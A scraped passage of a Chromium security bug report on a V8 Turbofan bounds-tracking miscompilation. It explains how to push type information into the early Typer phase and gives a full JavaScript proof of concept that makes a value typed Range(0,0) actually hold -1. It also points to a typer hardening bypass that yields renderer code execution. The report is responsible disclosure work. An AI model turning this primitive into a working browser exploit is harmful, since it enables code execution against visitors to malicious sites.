have a result of `lmax = rmax = 0`, which results in `max = 0` in the above code; but as the value for `x&y` that's miscalculated is `1`, we still break range-tracking.<span class="line"><!---->If we do this for both `x` *and* `y`, then we have a result of `lmax = rmax = 0`, which results in `max = 0` in the above code; but as the value for `x&amp;y` that's miscalculated is `1`, we still break range-tracking.<!----></span><br><br>However, one last obstacle remains: the type propagation to the additions and subtracions only happens during the LoadElimination phase; the `BitwiseAnd` however is only given a type once during the initial Typer phase; we can't use the typed optimization again as there is no equivalent "SpeculativeNumberAnd".<span class="line"><!---->However, one last obstacle remains: the type propagation to the additions and subtracions only happens during the LoadElimination phase; the `BitwiseAnd` however is only given a type once during the initial Typer phase; we can't use the typed optimization again as there is no equivalent "SpeculativeNumberAnd".<!----></span><br>So we need to somehow take the bounds information from the later LoadElimination phase and make it available already during the earlier Typer phase.<span class="line"><!---->So we need to somehow take the bounds information from the later LoadElimination phase and make it available already during the earlier Typer phase.<!----></span><br><br>Time-traveling bounds information<span class="line"><!---->Time-traveling bounds information<!----></span><br>---------------------------------<span class="line"><!---->---------------------------------<!----></span><br><br>It seems impossible for the information that we have gained about a node during the LoadElimination phase to influence the type of that node during the earlier Typer phase.<span class="line"><!---->It seems impossible for the information that we have gained about a node during the LoadElimination phase to influence the type of that node during the earlier Typer phase.<!----></span><br>But fortunately, we don't actually have to learn anything new *about that node*, we can instead add some additional operations that force the type we want during the initial Typer phase, and then use our additional later knowledge to optimize away those operations.<span class="line"><!---->But fortunately, we don't actually have to learn anything new *about that node*, we can instead add some additional operations that force the type we want during the initial Typer phase, and then use our additional later knowledge to optimize away those operations.<!----></span><br><br>For example, consider using `Math.min(0, x)`.<span class="line"><!---->For example, consider using `Math.min(0, x)`.<!----></span><br>The typer knows that this value is less than or equal to zero; and we would hope that the `Select` with condition `0<x` just gets optimized away later.<span class="line"><!---->The typer knows that this value is less than or equal to zero; and we would hope that the `Select` with condition `0&lt;x` just gets optimized away later.<!----></span><br>Unfortunately, this is not the case - the constant folder simply doesn't run after the time where we have gained the knowledge that `x <= 0` (this is probably the only time I will ever be annoyed about the constant folder *not* deleting stuff away).<span class="line"><!---->Unfortunately, this is not the case - the constant folder simply doesn't run after the time where we have gained the knowledge that `x &lt;= 0` (this is probably the only time I will ever be annoyed about the constant folder *not* deleting stuff away).<!----></span><br><br>But instead, consider `Math.min(2**32-1, x+(2**32-1)) - (2**32-1)`.<span class="line"><!---->But instead, consider `Math.min(2**32-1, x+(2**32-1)) - (2**32-1)`.<!----></span><br>Here the SimplifiedLowering-phase can use the knowledge about `x <= 0` to convert the first addition into an (unchecked) `Int32Add` treating the result as an unsigned 32-bit integer, as no overflow can happen.<span class="line"><!---->Here the SimplifiedLowering-phase can use the knowledge about `x &lt;= 0` to convert the first addition into an (unchecked) `Int32Add` treating the result as an unsigned 32-bit integer, as no overflow can happen.<!----></span><br>But the unsigned comparison `2**32-1 < c` for `c` of `uint32`-type *can* actually be optimized away to `false` by the MachineOperatorReducer:<span class="line"><!---->But the unsigned comparison `2**32-1 &lt; c` for `c` of `uint32`-type *can* actually be optimized away to `false` by the MachineOperatorReducer:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>    case IrOpcode::kUint32LessThan: {<span class="line"><!---->    case IrOpcode::kUint32LessThan: {<!----></span><br>      Uint32BinopMatcher m(node);<span class="line"><!---->      Uint32BinopMatcher m(node);<!----></span><br>      if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M < x => false<span class="line"><!---->      if (m.left().Is(kMaxUInt32)) return ReplaceBool(false);  // M &lt; x =&gt; false<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>This also results in the select being eliminated; the resulting expression `(x+(2**32-1)) - (2**32-1)` (where everything gets lowered to 32-bit operations) can eventually be reduced to just `x` by the MachineOperatorReducer (this optimization requires the fact that `x+(2**32-1)` is used nowhere else; this requirement destroys some other approaches to the problem).<span class="line"><!---->This also results in the select being eliminated; the resulting expression `(x+(2**32-1)) - (2**32-1)` (where everything gets lowered to 32-bit operations) can eventually be reduced to just `x` by the MachineOperatorReducer (this optimization requires the fact that `x+(2**32-1)` is used nowhere else; this requirement destroys some other approaches to the problem).<!----></span><br><br>Thus, none of the operations interfere with the buggy optimization being performed.<span class="line"><!---->Thus, none of the operations interfere with the buggy optimization being performed.<!----></span><br>But during the Typer phase, the additional `Math.min` has an effect: The typer learns that its result can be at most `2**32-1`, and the subtraction can't be positive.<span class="line"><!---->But during the Typer phase, the additional `Math.min` has an effect: The typer learns that its result can be at most `2**32-1`, and the subtraction can't be positive.<!----></span><br><br>In effect, both inputs to the `BitwiseAnd`-node now have a type of `Range(..., 0)`, so the `BitwiseAnd` itself also gets a non-positive type, which is violated by the miscomputed result of `1`.<span class="line"><!---->In effect, both inputs to the `BitwiseAnd`-node now have a type of `Range(..., 0)`, so the `BitwiseAnd` itself also gets a non-positive type, which is violated by the miscomputed result of `1`.<!----></span><br>To get a constant type of `Range(0, 0)` with a value that is actually `-1`, we can first take the maximum with `-1`, then negate and right-shift by `31`.<span class="line"><!---->To get a constant type of `Range(0, 0)` with a value that is actually `-1`, we can first take the maximum with `-1`, then negate and right-shift by `31`.<!----></span><br>The complete PoC for breaking Bounds tracking is:<span class="line"><!---->The complete PoC for breaking Bounds tracking is:<!----></span><br><br>```<span class="line"><!---->```<!----></span><br>function bar(a, arg_true) {<span class="line"><!---->function bar(a, arg_true) {<!----></span><br>    let o = {c0: 0, cf: false};<span class="line"><!---->    let o = {c0: 0, cf: false};<!----></span><br>    let x = ((a&5)==2)|0;<span class="line"><!---->    let x = ((a&amp;5)==2)|0;<!----></span><br>    let y = ((a&6)==1)|0;<span class="line"><!---->    let y = ((a&amp;6)==1)|0;<!----></span><br>    <span class="line"><!---->    <!----></span><br>    "a"[x];"a"[y]; // generate CheckBounds()<span class="line"><!---->    "a"[x];"a"[y]; // generate CheckBounds()<!----></span><br><br>    x = x + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30); // type is Range(-1,0), but only after LoadElimination<span class="line"><!---->    x = x + (o.cf ? "" : (2**30) - (o.c0&amp;1)) - (2**30); // type is Range(-1,0), but only after LoadElimination<!----></span><br>    y = y + (o.cf ? "" : (2**30) - (o.c0&1)) - (2**30);<span class="line"><!---->    y = y + (o.cf ? "" : (2**30) - (o.c0&amp;1)) - (2**30);<!----></span><br>    <span class="line"><!---->    <!----></span><br>    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); // type is Range(-1,0) already during Typer<span class="line"><!---->    x = Math.min(2**32-1, x + (2**32-1)) - (2**32-1); // type is Range(-1,0) already during Typer<!----></span><br>    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);<span class="line"><!---->    y = Math.min(2**32-1, y + (2**32-1)) - (2**32-1);<!----></span><br>    let confused = Math.max(-1,x & y); // type is Range(..., 0), really is 1<span class="line"><!---->    let confused = Math.max(-1,x &amp; y); // type is Range(..., 0), really is 1<!----></span><br>    confused = Math.max(-1, confused); // type is Range(-1, 0), really is 1<span class="line"><!---->    confused = Math.max(-1, confused); // type is Range(-1, 0), really is 1<!----></span><br>    confused = ((0-confused)>>31); // type is Range(0, 0), really is -1<span class="line"><!---->    confused = ((0-confused)&gt;&gt;31); // type is Range(0, 0), really is -1<!----></span><br>    return confused;<span class="line"><!---->    return confused;<!----></span><br>}<span class="line"><!---->}<!----></span><br><br>console.log(bar(3, true));<span class="line"><!---->console.log(bar(3, true));<!----></span><br>for (var i = 0; i < 3*10**4; i+=1) bar(0,true);<span class="line"><!---->for (var i = 0; i &lt; 3*10**4; i+=1) bar(0,true);<!----></span><br>console.log(bar(3,true));<span class="line"><!---->console.log(bar(3,true));<!----></span><br>```<span class="line"><!---->```<!----></span><br><br>Typer hardening bypass<span class="line"><!---->Typer hardening bypass<!----></span><br>----------------------<span class="line"><!---->----------------------<!----></span><br><br>I submitted a typer hardening bypass with another simultaneously reported bug (<span class="line"><!---->I submitted a typer hardening bypass with another simultaneously reported bug (<!----></span>issue #1234764<a class="strike-through" target="_blank" href="/p/chromium/issues/detail?id=1234764" title="v8/Turbofan: Invalid rotate-right optimization + Typer hardening bypass"><!---->issue #1234764<!----></a>) that can be used to obtain arbitrary code execution for this bug as well.<span class="line"><!---->) that can be used to obtain arbitrary code execution for this bug as well.<!----></span><br>The attached PoC demonstrates that code execution is achievable; for details see the other bug report.<span class="line"><!---->The attached PoC demonstrates that code execution is achievable; for details see the other bug report.<!----></span><br><br><br>#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so<span class="line"><!---->#### Please briefly explain who can exploit the vulnerability, and what they gain when doing so<!----></span><br><br>An attacker running a malicious website can get arbitrary code execution in the context of Chrome's renderer process.<span class="line"><!---->An attacker running a malicious website can get arbitrary code execution in the context of Chrome's renderer process.<!----></span><br><br><br>---<span class="line"><!---->---<!----></span><br><br>### The cause<span class="line"><!---->### The cause<!----></span><br><br><br>#### What version of Chrome have you found the security issue in?<span class="line"><!---->#### What version of Chrome have you found the security issue in?<!----></span><br><br>Chromium 92.0.4515.107 Arch Linux / v8 on current main branch<span class="line"><!---->Chromium 92.0.4515.107 Arch Linux / v8 on current main branch<!----></span><br><br><br>#### Is the security issue related to a crash?<span class="line"><!---->#### Is the security issue related to a crash?<!----></span><br><br>No<span class="line"><!---->No<!----></span><br><br><br>#### Choose the type of vulnerability<span class="line"><!---->#### Choose the type of vulnerability<!----></span><br><br>Remote Code Execution (RCE)<span class="line"><!---->Remote Code Execution (RCE)<!----></span><br><br><br>#### Please provide your credit information<span class="line"><!---->#### Please provide your credit information<!----></span><br><br>Manfred Paul (@_manfp)<span class="line"><!---->Manfred Paul (@_manfp)<!----></span><mr-comment-content></mr-comment-content>

          Comment 4<a class="comment-link" href="?id=1234770#c4">Comment 4<!----></a>

        *** Boilerplate reminders! ***<span class="line"><!---->*** Boilerplate reminders! ***<!----></span><br>Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<span class="line"><!---->Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.<!----></span><br><br>Please contact <span class="line"><!---->Please contact <!----></span>security-vrp@chromium.org<a class="undefined" target="_blank" href="mailto:security-vrp@chromium.org"><!---->security-vrp@chromium.org<!----></a> with any questions.<span class="line"><!----> with any questions.<!----></span><br>******************************<span class="line"><!---->******************************<!----></span><mr-comment-content></mr-comment-content>

           issue<h3 class="medium-heading"><!----> issue</h3>
          
            Target project:<label for="targetProjectInput">Target project:</label>
            
              <input id="targetProjectInput" aria-owns="chops-autocomplete-1" aria-autocomplete="both" aria-expanded="false" aria-haspopup="listbox" aria-activedescendant="">
              
      
        /*
         * Really specific class names are necessary because ShadowDOM
         * is disabled for this component.
         */
        .chops-autocomplete-container {
          position: relative;
        }
        .chops-autocomplete-container table {
          padding: 0;
          font-size: var(--chops-main-font-size);
          color: var(--chops-link-color);
          position: absolute;
          background: var(--chops-white);
          border: var(--chops-accessible-border);
          z-index: 999;
          box-shadow: 2px 3px 8px 0px hsla(0, 0%, 0%, 0.3);
          border-spacing: 0;
          border-collapse: collapse;
          /* In the case when the autocomplete extends the
           * height of the viewport, we want to make sure
           * there's spacing. */
          margin-bottom: 1em;
        }
        .chops-autocomplete-container tbody {
          display: block;
          min-width: 100px;
          max-height: 500px;
          overflow: auto;
        }
        .chops-autocomplete-container tr {
          cursor: pointer;
          transition: background 0.2s ease-in-out;
        }
        .chops-autocomplete-container tr[data-selected] {
          background: var(--chops-active-choice-bg);
          text-decoration: underline;
        }
        .chops-autocomplete-container td {
          padding: 0.25em 8px;
          white-space: nowrap;
        }
        .screenreader-hidden {
          clip: rect(1px, 1px, 1px, 1px);
          height: 1px;
          overflow: hidden;
          position: absolute;
          white-space: nowrap;
          width: 1px;
        }

 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
<script type="text/javascript" nonce="">
 runOnLoad(function() {
 if (typeof(ClientLogger) === "function") {
 let cl = new ClientLogger("issues");
 if (cl.started("new-issue")) {
 cl.logEnd("new-issue", null, 120 * 1000);
 }
 if (cl.started("issue-search")) {
 cl.logEnd("issue-search");
 }
 }
 });
</script>
